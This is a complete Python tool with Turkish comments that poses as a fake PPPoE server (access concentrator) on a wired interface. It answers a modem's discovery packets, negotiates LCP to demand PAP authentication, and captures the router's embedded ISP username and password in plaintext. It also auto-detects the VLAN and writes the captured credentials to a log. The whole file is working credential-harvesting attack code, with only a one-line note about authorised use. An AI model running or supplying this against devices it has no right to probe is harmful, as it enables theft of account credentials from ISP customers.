#!/usr/bin/env python3
"""
Zentra-PPPoE — AKTİF MOD (sahte PPPoE sunucusu / Access Concentrator)
====================================================================
Kilitli modem/router'a PPPoE sunucusu gibi cevap verir, böylece kimlik
doğrulama (PAP) aşamasına geçmesini ve gömülü kullanıcı adı/şifresini
göndermesini sağlar. Pasif dinleyiciden farkı: router'ı KONUŞTURUR.

YALNIZCA kendi hattınızda / yetkili olduğunuz hatta kullanın.
Yönetici (Windows) / root (Linux-macOS) + Npcap (Windows) gerekir.

Kullanım:
    sudo python3 zentra_server.py           # arayüzü otomatik seçer (varsa Ethernet)
    sudo python3 zentra_server.py -i eth0    # arayüzü elle ver
"""

import argparse
import re
import struct
import sys

from scapy.all import (Ether, Dot1Q, sendp, AsyncSniffer, get_if_hwaddr,
                       get_working_ifaces)
from scapy.layers.ppp import (
    PPPoED, PPPoE, PPP, PPP_LCP, PPP_LCP_Configure,
    PPP_LCP_Auth_Protocol_Option,
)
from zentra_ui import (enable_ansi, banner, panel, warn, dim,
                       hunt, hunt_arrow, granted, CLEAR, RED, GREEN)

# PPPoE discovery kodları
PADI, PADO, PADR, PADS, PADT = 0x09, 0x07, 0x19, 0x65, 0xA7
# PPP protokolleri
PROTO_LCP, PROTO_PAP, PROTO_CHAP = 0xC021, 0xC023, 0xC223
# Tag tipleri
T_SERVICE, T_ACNAME, T_HOSTUNIQ, T_ACCOOKIE = 0x0101, 0x0102, 0x0103, 0x0104

SESSION_ID = 0x0001
AC_NAME = b"zentra"


LOGFILE = None
_ANSI_RE = re.compile(r"\033\[[0-9;]*m")


def log(msg):
    print(msg, flush=True)
    if LOGFILE:
        try:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(_ANSI_RE.sub("", msg) + "\n")
        except Exception:
            pass


def tlv(t, v):
    return struct.pack("!HH", t, len(v)) + v


def parse_tags(data):
    out = {}
    i = 0
    while i + 4 <= len(data):
        t, ln = struct.unpack("!HH", data[i:i + 4])
        i += 4
        out[t] = data[i:i + ln]
        i += ln
    return out


class ZentraServer:
    def __init__(self, iface, vlan=None):
        self.iface = iface
        self.my_mac = get_if_hwaddr(iface)
        self.vlan = vlan            # 802.1Q VLAN id (TTNet=35), yoksa None
        self.client = None
        self.lcp_sent = False
        self.done = False

    def _eth(self, dst, etype):
        """Ethernet başlığı; VLAN varsa 802.1Q etiketi ekler."""
        e = Ether(src=self.my_mac, dst=dst)
        if self.vlan is not None:
            return e / Dot1Q(vlan=self.vlan, type=etype)
        e.type = etype
        return e

    def _vtag(self):
        return f" (VLAN {self.vlan})" if self.vlan is not None else ""

    # ---------------- Discovery ----------------
    def send_pado(self, padi):
        t = parse_tags(bytes(padi[PPPoED].payload))
        body = tlv(T_SERVICE, t.get(T_SERVICE, b""))
        body += tlv(T_ACNAME, AC_NAME)
        if T_HOSTUNIQ in t:
            body += tlv(T_HOSTUNIQ, t[T_HOSTUNIQ])
        body += tlv(T_ACCOOKIE, b"zentra0")
        pkt = (self._eth(padi[Ether].src, 0x8863) /
               PPPoED(version=1, type=1, code=PADO, sessionid=0) / body)
        sendp(pkt, iface=self.iface, verbose=0)
        log(hunt_arrow(f"PADO gönderildi{self._vtag()}"))

    def send_pads(self, padr):
        t = parse_tags(bytes(padr[PPPoED].payload))
        body = tlv(T_SERVICE, t.get(T_SERVICE, b""))
        if T_HOSTUNIQ in t:
            body += tlv(T_HOSTUNIQ, t[T_HOSTUNIQ])
        pkt = (self._eth(padr[Ether].src, 0x8863) /
               PPPoED(version=1, type=1, code=PADS, sessionid=SESSION_ID) / body)
        sendp(pkt, iface=self.iface, verbose=0)
        log(hunt_arrow(f"PADS gönderildi (oturum id={SESSION_ID})"))

    # ---------------- PPP / LCP ----------------
    def _session(self, ppp_payload):
        pkt = (self._eth(self.client, 0x8864) /
               PPPoE(version=1, type=1, code=0, sessionid=SESSION_ID) /
               ppp_payload)
        sendp(pkt, iface=self.iface, verbose=0)

    def send_our_lcp_request(self):
        req = PPP_LCP_Configure(
            code=1, id=1,
            options=[PPP_LCP_Auth_Protocol_Option(auth_protocol=PROTO_PAP)])
        self._session(PPP(proto=PROTO_LCP) / req)
        self.lcp_sent = True
        log(hunt_arrow("LCP Configure-Request (PAP iste) gönderildi"))

    def send_lcp_ack(self, lcp_cfg):
        ack = PPP_LCP_Configure(code=2, id=lcp_cfg.id,
                                options=lcp_cfg.options)
        self._session(PPP(proto=PROTO_LCP) / ack)
        log(hunt_arrow("LCP Configure-Ack gönderildi"))

    # ---------------- PAP ----------------
    def parse_pap(self, data):
        if len(data) < 5 or data[0] != 1:
            return
        idx = 4
        ulen = data[idx]; idx += 1
        username = data[idx:idx + ulen].decode("utf-8", "replace"); idx += ulen
        if idx >= len(data):
            return
        plen = data[idx]; idx += 1
        password = data[idx:idx + plen].decode("utf-8", "replace")
        vtxt = str(self.vlan) if self.vlan is not None else "-"
        print(CLEAR, end="", flush=True)   # ekran kırmızıdan yeşile döner
        log(banner(GREEN))
        log(granted())
        log("")
        log(panel("PPPoE Credentials", [
            f"Username   : {username}",
            f"Password   : {password}",
            f"Client MAC : {self.client}",
            f"VLAN       : {vtxt}",
        ], color=GREEN, footer="Zentra") + "\n")
        self.done = True

    # ---------------- ana dağıtıcı ----------------
    def handle(self, pkt):
        if pkt.haslayer(PPPoED):
            code = pkt[PPPoED].code
            names = {PADI: "PADI", PADO: "PADO", PADR: "PADR",
                     PADS: "PADS", PADT: "PADT"}
            src = pkt[Ether].src
            mine = (src == self.my_mac)
            log(f"[disc] {names.get(code, hex(code))} "
                f"{'(bizden)' if mine else 'src=' + src}")
            if mine:
                return
            if code == PADI:
                self.client = src
                if self.vlan is None and pkt.haslayer(Dot1Q):
                    self.vlan = pkt[Dot1Q].vlan
                    log(hunt(f"VLAN {self.vlan} otomatik algılandı"))
                tags = parse_tags(bytes(pkt[PPPoED].payload))
                log("   PADI tag'leri: " +
                    (", ".join(f"{hex(t)}={v.hex() or '(bos)'}"
                               for t, v in tags.items()) or "(yok)"))
                self.send_pado(pkt)
            elif code == PADR:
                self.client = src
                log(hunt("PADR alındı — oturum açılıyor"))
                self.send_pads(pkt)
                self.send_our_lcp_request()
            return

        if pkt.haslayer(PPPoE) and pkt[PPPoE].code == 0 and pkt.haslayer(PPP):
            proto = pkt[PPP].proto
            if pkt[Ether].src != self.my_mac:
                log(f"[sess] PPP proto={hex(proto)}")
            if proto == PROTO_LCP:
                lcp = pkt.getlayer(PPP_LCP_Configure)
                if lcp is not None and lcp.code == 1:        # peer Config-Request
                    log(hunt("LCP Configure-Request alındı"))
                    self.send_lcp_ack(lcp)
                    if not self.lcp_sent:
                        self.send_our_lcp_request()
            elif proto == PROTO_PAP:
                self.parse_pap(bytes(pkt[PPP].payload))
            elif proto == PROTO_CHAP:
                log(warn("Modem CHAP kullanıyor — şifre hash'li gelir, "
                         "düz metin çıkmaz."))


def pick_iface(name):
    """Kablolu Ethernet arayüzünü otomatik seç (Windows / macOS / Linux)."""
    if name:
        return name
    ifaces = list(get_working_ifaces())

    def label(i):
        return ((getattr(i, "description", "") or "") + " " + i.name).lower()

    # Kablosuz / loopback / sanal arayüzleri ele
    bad = ("loopback", "wi-fi", "wifi", "wlan", "wireless", "awdl", "bridge",
           "utun", "llw", "vmnet", "virtual", "vethernet", "tap", "tun",
           "bluetooth", "p2p", "docker")
    cands = [i for i in ifaces if not any(b in label(i) for b in bad)]

    # 1) Açık biçimde "ethernet/realtek/intel/lan" geçenler
    good = ("ethernet", "realtek", "gbe", "intel", "lan")
    for i in cands:
        if any(g in label(i) for g in good):
            return i.name
    # 2) macOS/Linux isim deseni: en0, eth0, enp3s0...
    for i in cands:
        n = i.name.lower()
        if n.startswith(("en", "eth", "enp", "eno")):
            return i.name
    # 3) Son çare
    if cands:
        return cands[0].name
    if ifaces:
        return ifaces[0].name
    return None


def main():
    ap = argparse.ArgumentParser(
        description="Zentra-PPPoE aktif mod (sahte PPPoE sunucusu).")
    ap.add_argument("-i", "--interface", help="Ağ arayüzü (boşsa otomatik)")
    ap.add_argument("-l", "--vlan", type=int, default=None,
                    help="802.1Q VLAN id (TTNet=35). Boşsa PADI'den otomatik.")
    ap.add_argument("--out", help="Çıktıyı bu dosyaya da yaz")
    args = ap.parse_args()

    if args.out:
        global LOGFILE
        LOGFILE = args.out

    iface = pick_iface(args.interface)
    if not iface:
        log("[!] Arayüz bulunamadı. -i ile elle verin.")
        sys.exit(1)

    enable_ansi()
    log(banner(RED))

    vlan = args.vlan
    if vlan is None:
        try:
            resp = input(hunt("VLAN id gir (TTNet=35, boş=otomatik algıla): ")).strip()
        except (EOFError, KeyboardInterrupt):
            resp = ""
        if resp:
            try:
                vlan = int(resp)
            except ValueError:
                log(warn("Geçersiz değer — otomatik algılamaya geçildi."))

    srv = ZentraServer(iface, vlan=vlan)
    log(hunt(f"Arayüz: {iface}  ·  MAC: {srv.my_mac}"))
    vtxt = vlan if vlan is not None else "PADI'den otomatik"
    log(hunt(f"VLAN  : {vtxt}"))
    log(hunt("DURUM: ARANIYOR — modemin WAN kablosunu sök-tak yap."))
    log(dim("    Durdurmak için Ctrl+C."))
    log("")

    sn = AsyncSniffer(iface=iface, prn=srv.handle, store=False)
    try:
        sn.start()
        while not srv.done:
            sn.join(timeout=1)
            if not sn.running:
                break
    except KeyboardInterrupt:
        log("\n[*] Durduruldu.")
    finally:
        try:
            sn.stop()
        except Exception:
            pass

    if not srv.done:
        log("\n[-] Kimlik bilgisi alınamadı. Olası sebepler:")
        log("    - Modem bu portta PPPoE kullanmıyor (DHCP/IPoE olabilir)")
        log("    - Sök-tak sırasında dinleme açık değildi")
        log("    - Modem CHAP kullanıyor (şifre düz metin gelmez)")


if __name__ == "__main__":
    main()
